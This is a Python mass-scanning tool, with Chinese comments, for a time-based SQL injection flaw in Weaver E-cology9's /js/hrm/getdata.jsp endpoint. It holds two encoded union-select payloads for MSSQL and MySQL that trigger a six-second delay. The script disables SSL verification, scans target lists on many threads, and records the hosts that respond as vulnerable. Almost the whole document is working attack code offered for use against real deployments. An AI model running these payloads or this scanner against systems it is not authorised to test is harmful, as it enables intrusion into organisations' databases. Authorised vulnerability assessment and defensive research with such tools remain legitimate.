import requests
import time
import argparse
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor

# 禁用SSL警告
requests.packages.urllib3.disable_warnings()

def check_vulnerability(target):
    """检测单个目标是否存在漏洞"""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # MSSQL
    payload1 = "/js/hrm/getdata.jsp?cmd=savect&arg0=%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%25%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%63%25%33%35%25%32%63%25%33%36%25%33%62%25%37%32%25%36%35%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%37%35%25%37%32%25%36%35%25%33%62%25%36%34%25%36%35%25%36%33%25%36%63%25%36%31%25%37%32%25%36%35%25%32%30%25%34%30%25%37%34%25%32%30%25%36%65%25%37%36%25%36%31%25%37%32%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%31%25%33%30%25%33%30%25%32%39%25%32%66%25%32%61%25%32%61%25%32%66%25%37%33%25%36%35%25%37%34%25%32%30%25%34%30%25%37%34%25%33%64%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%34%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%35%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%34%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%35%25%33%38%25%32%39%25%32%63%25%36%33%25%36%38%25%36%31%25%37%32%25%32%38%25%33%35%25%33%34%25%32%39%25%32%39%25%32%66%25%32%61%25%32%61%25%32%66%25%37%37%25%36%31%25%36%39%25%37%34%25%36%36%25%36%66%25%37%32%25%32%30%25%36%34%25%36%35%25%36%63%25%36%31%25%37%39%25%32%30%25%34%30%25%37%34%25%32%66%25%32%61%25%32%30%25%36%34%25%36%34%25%32%30%25%36%63%25%36%35%25%36%36%25%37%34%25%32%30%25%36%38%25%36%31%25%37%33%25%36%38%25%32%30%25%36%61%25%36%66%25%36%39%25%36%65%25%32%30%25%32%61%25%32%66%25%32%64%25%32%64%25%32%62"
    # MYSQL
    payload2 = "/js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256E%2569%256F%256E%2520%2573%2565%256C%2565%2563%2574%2520%2531%252C%2532%252C%2533%252C%2534%252C%2535%252C%2553%254C%2545%2545%2550%2528%2536%2529%2520%2523"
    
    urls = [urljoin(target, payload) for payload in [payload1, payload2]]
    elapsed = [0.0] * 2  # 初始化固定长度的列表
    status_codes = []

    try:
        for i in range(2):
            start_time = time.time()
            r = requests.get(
                urls[i], 
                headers=headers, 
                verify=False, 
                timeout=15,
                allow_redirects=True
            )
            elapsed[i] = time.time() - start_time
            status_codes.append(r.status_code)

        all_success = any(code == 200 for code in status_codes)
        has_delay = any(6.0 <= e <= 7.0 for e in elapsed)

        if all_success and has_delay:
            return target, True, f"响应时间: [{elapsed[0]:.2f}|{elapsed[1]:.2f}] (MSSQL/MYSQL)"
        else:
            return target, False, f"条件不满足"
            
    except requests.exceptions.RequestException as e:
        return target, False, f"请求失败"

def normalize_target(target):
    """规范化目标URL，添加缺失的协议头"""
    target = target.strip()
    
    # 如果目标已有协议头，直接返回
    if target.startswith("http://") or target.startswith("https://"):
        return [target]
    
    # 如果目标包含端口号，保留端口号
    if ":" in target and not target.startswith("["):  # 排除IPv6地址
        host, port = target.rsplit(":", 1)
        if port.isdigit():  # 确认是端口号
            return [
                f"http://{host}:{port}",
                f"https://{host}:{port}"
            ]
    
    # 普通目标尝试两种协议
    return [
        f"http://{target}",
        f"https://{target}"
    ]

def main():
    
    BANNER = r"""泛微E-cology9 SQL注入漏洞批量检测工具
GitHub: https://github.com/YanC1e/ecology9_sqli
============================================================"""
    
    # 创建参数解析器
    parser = argparse.ArgumentParser(
        description=BANNER,
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )
    
    # 添加参数
    parser.add_argument("-h", "--help", action="store_true", help=" 显示帮助信息")
    parser.add_argument("-t", "--target", help="指定单个目标URL")
    parser.add_argument("-f", "--file", help="从文件读取目标URL列表")
    parser.add_argument("-o", "--output", help="将存在漏洞的地址保存到文件")
    parser.add_argument("-T", "--threads", type=int, default=5, help="设置并发线程数 (默认: 5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="显示详细输出信息")
    
    args = parser.parse_args()
    
    # 自定义帮助显示
    if args.help or (not args.target and not args.file):
        print(BANNER)
        print("\n使用方法:")
        print("  python3 1.py [-h] [-t TARGET] [-f FILE] [-o OUTPUT] [-T THREADS] [-v]")
        print("\n选项:")
        print("  -h, --help            显示此帮助信息")
        print("  -t, --target TARGET   指定单个目标URL")
        print("  -f, --file FILE       从文件读取目标URL列表")
        print("  -o, --output OUTPUT   将存在漏洞的地址保存到文件")
        print("  -T, --threads THREADS 设置并发线程数 (默认: 5)")
        print("  -v, --verbose         显示详细输出信息")
        print("\n示例:")
        print("  扫描单个目标: python3 1.py -t http://example.com")
        print("  批量扫描目标: python3 1.py -f targets.txt -o results.txt -T 10")
        print("  显示详细信息: python3 1.py -t http://example.com -v")
        return
    
    # 收集目标列表
    targets = []
    
    # 处理单个目标
    if args.target:
        targets.extend(normalize_target(args.target))
    
    # 处理文件中的目标
    if args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    if line.strip():
                        targets.extend(normalize_target(line))
        except FileNotFoundError:
            print(f"[-] 错误: 文件 '{args.file}' 不存在")
            return
    
    # 去重并打印目标列表
    targets = list(set(targets))
    
    if args.verbose:
        print("[*] 目标列表:")
        for t in targets:
            print(f"  - {t}")
    
    print(f"[*] 开始扫描 {len(targets)} 个目标, 线程数: {args.threads}")
    
    vulnerable_targets = []  # 只保存存在漏洞的地址
    vulnerable_count = 0
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(check_vulnerability, target) for target in targets]
        
        for future in futures:
            target, is_vuln, msg = future.result()
            status = "存在漏洞" if is_vuln else "安全"
            result_str = f"[{status}] {target} - {msg}"
            
            if is_vuln:
                vulnerable_count += 1
                # 漏洞目标用红色高亮显示
                result_str = f"\033[91m{result_str}\033[0m"
                # 只保存存在漏洞的地址
                vulnerable_targets.append(target)
            
            print(result_str)
    
    # 保存结果 - 只保存存在漏洞的地址
    if args.output and vulnerable_targets:
        with open(args.output, 'w') as f:
            f.write("\n".join(vulnerable_targets))
        print(f"\n[+] 漏洞地址已保存到: {args.output} (共 {len(vulnerable_targets)} 条)")
    elif args.output and not vulnerable_targets:
        print("\n[-] 未发现漏洞，未生成结果文件")
    
    # 打印统计信息
    print(f"\n[+] 扫描完成! 共扫描 {len(targets)} 个目标, 发现 {vulnerable_count} 个存在漏洞")

if __name__ == "__main__":
    main()
